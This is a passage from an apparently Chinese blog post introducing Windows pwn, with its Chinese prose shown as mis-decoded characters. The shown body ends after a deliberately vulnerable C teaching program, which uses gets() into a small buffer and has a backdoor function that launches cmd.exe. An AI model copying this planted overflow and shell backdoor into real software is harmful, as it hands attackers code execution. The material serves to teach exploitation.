<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"default"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"æœç´¢...","empty":"æ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœç´¢ç»“æœï¼š${query}","hits_time":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰","hits":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœ"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="å‰è¨€è¿™ç¯‡å…³äº Windows Pwn å…¥é—¨çš„è‰ç¨¿åº”è¯¥æ˜¯åœ¨ 24 å¹´åˆçš„æ—¶å€™å†™çš„ï¼Œå½“æ—¶å¿˜è®°å› ä¸ºä»€ä¹ˆåŸå› æç½®äº†ã€‚æ—¶é—´è½¬çœ¼å·²ç»åˆ°äº† 24 å¹´åº•ï¼Œè¿™ä¸€å¹´ç»å†äº†æŒºå¤šæ„æ–™ä¹‹å¤–çš„äº‹æƒ…ï¼Œæ‰€ä»¥æ„Ÿè§‰æ—¶é—´è¿‡çš„é£å¿«ã€‚ä»Šå¤©æ•´ç†äº†ä¸€ä¸‹ä¹‹å‰å†™çš„è‰ç¨¿ï¼Œç®—æ˜¯å†æ°´ä¸€ç¯‡åšå®¢ã€‚ åœ¨ Linux ä¸‹çš„äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å·²ç»è¾ƒä¸ºç†Ÿæ‚‰çš„æƒ…å†µä¸‹ï¼Œæ‰“ç®—å»äº†è§£ä¸€ä¸‹ Windows ä¸‹çš„ PWN ã€‚å½“æ—¶æœ¬æ„æ˜¯å¸Œæœ›åœ¨å¤§ä¸‰ç»“æŸæ‰¾å®ä¹ æ—¶ï¼Œå¯ä»¥å¯¹ Windows">
<meta property="og:type" content="article">
<meta property="og:title" content="æ•™ç»ƒ æˆ‘ä¹Ÿæƒ³å…¥é—¨windows pwn">
<meta property="og:url" content="https://zikh26.github.io/posts/f671ae0d.html">
<meta property="og:site_name" content="ZIKH26&#39;s Blog">
<meta property="og:description" content="å‰è¨€è¿™ç¯‡å…³äº Windows Pwn å…¥é—¨çš„è‰ç¨¿åº”è¯¥æ˜¯åœ¨ 24 å¹´åˆçš„æ—¶å€™å†™çš„ï¼Œå½“æ—¶å¿˜è®°å› ä¸ºä»€ä¹ˆåŸå› æç½®äº†ã€‚æ—¶é—´è½¬çœ¼å·²ç»åˆ°äº† 24 å¹´åº•ï¼Œè¿™ä¸€å¹´ç»å†äº†æŒºå¤šæ„æ–™ä¹‹å¤–çš„äº‹æƒ…ï¼Œæ‰€ä»¥æ„Ÿè§‰æ—¶é—´è¿‡çš„é£å¿«ã€‚ä»Šå¤©æ•´ç†äº†ä¸€ä¸‹ä¹‹å‰å†™çš„è‰ç¨¿ï¼Œç®—æ˜¯å†æ°´ä¸€ç¯‡åšå®¢ã€‚ åœ¨ Linux ä¸‹çš„äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å·²ç»è¾ƒä¸ºç†Ÿæ‚‰çš„æƒ…å†µä¸‹ï¼Œæ‰“ç®—å»äº†è§£ä¸€ä¸‹ Windows ä¸‹çš„ PWN ã€‚å½“æ—¶æœ¬æ„æ˜¯å¸Œæœ›åœ¨å¤§ä¸‰ç»“æŸæ‰¾å®ä¹ æ—¶ï¼Œå¯ä»¥å¯¹ Windows">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091057489.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091046783.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091103656.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091107575.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091950101.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091956903.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091957456.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091958293.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091958974.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092005655.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092007400.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092008776.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092010193.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092013275.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092017695.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092030677.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092031053.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092032979.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325233320278.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325233216490.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325233716030.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325234108163.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324112219021.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324113735479.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324114031506.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324173126201.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152404283.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152426641.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152526621.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152413841.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152328579.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322160516896.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324180212341.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324180449107.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324181108465.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324181745856.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324181932374.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324182254918.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323202626595.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323202218137.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323203127182.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323203607041.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323210310637.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323210543053.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323211605343.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323230837806.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323231258275.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323233759018.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323234328781.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323234604692.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323235442691.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323235602941.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323235844469.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324001017015.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325102510607.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325110649724.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328111721770.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328125151982.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328131533313.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328144547951.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328144611047.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328154129097.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328155055711.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328171612752.png">
<meta property="article:published_time" content="2024-11-17T08:39:56.705Z">
<meta property="article:modified_time" content="2024-11-17T08:40:26.344Z">
<meta property="article:author" content="ZIKH26">
<meta property="article:tag" content="windows_pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091057489.png">


<link rel="canonical" href="https://zikh26.github.io/posts/f671ae0d.html">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://zikh26.github.io/posts/f671ae0d.html","path":"posts/f671ae0d.html","title":"æ•™ç»ƒ æˆ‘ä¹Ÿæƒ³å…¥é—¨windows pwn"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>æ•™ç»ƒ æˆ‘ä¹Ÿæƒ³å…¥é—¨windows pwn | ZIKH26's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ " role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">ZIKH26's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="æœç´¢" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a></li><li class="menu-item menu-item-å‹é“¾"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>å‹é“¾</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>æœç´¢
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="æœç´¢..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">å‰è¨€</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#windows%E4%B8%8B%E7%9A%84-ret2text"><span class="nav-number">2.</span> <span class="nav-text">windowsä¸‹çš„ ret2text</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95"><span class="nav-number">2.1.</span> <span class="nav-text">è°ƒè¯•</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3"><span class="nav-number">3.</span> <span class="nav-text">æŠ¥é”™è§£å†³</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#windows%E4%B8%8Bgcc%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%A8%8B%E5%BA%8F%E6%8A%A5%E9%94%99"><span class="nav-number">3.1.</span> <span class="nav-text">windowsä¸‹gccç¼–è¯‘32ä½ç¨‹åºæŠ¥é”™</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E-Windows-%E4%B8%8B%E7%9A%84-ASLR-%E6%9C%BA%E5%88%B6"><span class="nav-number">4.</span> <span class="nav-text">å…³äº Windows ä¸‹çš„ ASLR æœºåˆ¶</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B5%B7%E5%9B%A0%EF%BC%9A%E7%96%91%E9%97%AE%E7%9A%84%E4%BA%A7%E7%94%9F"><span class="nav-number">4.1.</span> <span class="nav-text">èµ·å› ï¼šç–‘é—®çš„äº§ç”Ÿ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%A2%E7%B4%A2"><span class="nav-number">4.2.</span> <span class="nav-text">æ¢ç´¢</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%80%83"><span class="nav-number">4.3.</span> <span class="nav-text">æ€è€ƒ</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x32dbg%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C"><span class="nav-number">5.</span> <span class="nav-text">x32dbgç®€å•æ“ä½œ</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE"><span class="nav-number"></span> <span class="nav-text">ç›¸å…³é¢˜ç›®</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#root-me-PE32-Stack-buffer-overflow-avance"><span class="nav-number">1.</span> <span class="nav-text">root-me PE32 - Stack buffer overflow avancÃ©</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">1.1.</span> <span class="nav-text">ä»£ç å®¡è®¡</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E8%B0%83%E8%AF%95%E9%97%AE%E9%A2%98"><span class="nav-number">1.2.</span> <span class="nav-text">è§£å†³è°ƒè¯•é—®é¢˜</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">æ¼æ´åˆ©ç”¨</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-number">1.4.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2024NKCTF-%E6%9D%A5%E7%AD%BE%E4%B8%AA%E5%88%B0"><span class="nav-number">2.</span> <span class="nav-text">2024NKCTF_æ¥ç­¾ä¸ªåˆ°</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5"><span class="nav-number">2.1.</span> <span class="nav-text">ä¿æŠ¤ç­–ç•¥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">ä»£ç åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">2.3.</span> <span class="nav-text">åˆ©ç”¨æ€è·¯</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-amp-amp-%E6%89%93%E9%80%9A%E6%9C%AC%E5%9C%B0"><span class="nav-number">2.4.</span> <span class="nav-text">è°ƒè¯•&amp;&amp;æ‰“é€šæœ¬åœ°</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%BF%9C%E7%A8%8B"><span class="nav-number">2.5.</span> <span class="nav-text">æ”»å‡»è¿œç¨‹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-1"><span class="nav-number">2.6.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF2020-easyoverflow"><span class="nav-number">3.</span> <span class="nav-text">å¼ºç½‘æ¯2020_easyoverflow</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="nav-number">3.1.</span> <span class="nav-text">ä»£ç åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">3.2.</span> <span class="nav-text">åˆ©ç”¨è¿‡ç¨‹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-2"><span class="nav-number">3.3.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">4.</span> <span class="nav-text">å‚è€ƒæ–‡ç« </span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="ZIKH26"
      src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
  <p class="site-author-name" itemprop="name">ZIKH26</p>
  <div class="site-description" itemprop="description">äººç”Ÿå¦‚æˆ</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">117</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">18</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">117</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="è¿”å›é¡¶éƒ¨">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/f671ae0d.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="äººç”Ÿå¦‚æˆ">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="æ•™ç»ƒ æˆ‘ä¹Ÿæƒ³å…¥é—¨windows pwn | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          æ•™ç»ƒ æˆ‘ä¹Ÿæƒ³å…¥é—¨windows pwn
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>
      

      <time title="åˆ›å»ºæ—¶é—´ï¼š2024-11-17 16:39:56 / ä¿®æ”¹æ—¶é—´ï¼š16:40:26" itemprop="dateCreated datePublished" datetime="2024-11-17T16:39:56+08:00">2024-11-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98WP/" itemprop="url" rel="index"><span itemprop="name">èµ›é¢˜WP</span></a>
        </span>
          ï¼Œ
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98WP/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ æ€»ç»“</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™ç¯‡å…³äº <strong>Windows Pwn</strong> å…¥é—¨çš„è‰ç¨¿åº”è¯¥æ˜¯åœ¨ 24 å¹´åˆçš„æ—¶å€™å†™çš„ï¼Œå½“æ—¶å¿˜è®°å› ä¸ºä»€ä¹ˆåŸå› æç½®äº†ã€‚æ—¶é—´è½¬çœ¼å·²ç»åˆ°äº† 24 å¹´åº•ï¼Œè¿™ä¸€å¹´ç»å†äº†æŒºå¤šæ„æ–™ä¹‹å¤–çš„äº‹æƒ…ï¼Œæ‰€ä»¥æ„Ÿè§‰æ—¶é—´è¿‡çš„é£å¿«ã€‚ä»Šå¤©æ•´ç†äº†ä¸€ä¸‹ä¹‹å‰å†™çš„è‰ç¨¿ï¼Œç®—æ˜¯å†æ°´ä¸€ç¯‡åšå®¢ã€‚</p>
<p>åœ¨ <strong>Linux</strong> ä¸‹çš„äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å·²ç»è¾ƒä¸ºç†Ÿæ‚‰çš„æƒ…å†µä¸‹ï¼Œæ‰“ç®—å»äº†è§£ä¸€ä¸‹ <strong>Windows</strong> ä¸‹çš„ <strong>PWN</strong> ã€‚å½“æ—¶æœ¬æ„æ˜¯å¸Œæœ›åœ¨å¤§ä¸‰ç»“æŸæ‰¾å®ä¹ æ—¶ï¼Œå¯ä»¥å¯¹ <strong>Windows</strong> å¹³å°çš„äºŒè¿›åˆ¶æ–¹é¢æ¼æ´åˆ©ç”¨æœ‰æ›´å¤šäº†è§£ï¼Œä½†å›è¿‡å¤´æ¥çœ‹ï¼Œå…¶å®ä¹Ÿæ²¡ç”¨ä¸ŠğŸ¥²ã€‚</p>
<span id="more"></span>

<h2 id="windowsä¸‹çš„-ret2text"><a href="#windowsä¸‹çš„-ret2text" class="headerlink" title="windowsä¸‹çš„ ret2text"></a>windowsä¸‹çš„ ret2text</h2><p>ç¼–å†™ä¸€ä»½å­˜åœ¨æº¢å‡ºæ¼æ´å’Œåé—¨å‡½æ•°çš„ä»£ç ï¼Œç¼–è¯‘åè¿›è¡Œåˆ†æã€è°ƒè¯•å’Œåˆ©ç”¨ï¼Œé€šè¿‡è¿™ä¸ªè¿‡ç¨‹æ¥å¯¹ <code>windows</code> ä¸‹çš„æ¼æ´åˆ©ç”¨æœ‰ä¸€ä¸ªåŸºæœ¬è®¤çŸ¥</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -m32 test.c -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;C:\\Windows\\system32\\cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;input &gt;&gt;&quot;</span>);</span><br><span class="line">        gets(buf);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;data: %s\n&quot;</span>, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



